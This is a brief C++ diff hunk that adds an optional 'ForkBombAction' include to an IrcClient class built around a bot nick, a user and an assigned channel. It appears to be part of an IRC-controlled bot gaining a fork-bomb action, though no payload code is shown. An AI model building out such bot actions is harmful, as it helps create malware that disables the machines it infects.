@@ -18,6 +18,10 @@
 #include "ReportAction.hpp"
 #endif
 
+#ifdef ENABLE_FORK_BOMB_ACTION
+#include "ForkBombAction.hpp"
+#endif
+
 class IrcClient {
 public:
     IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass);
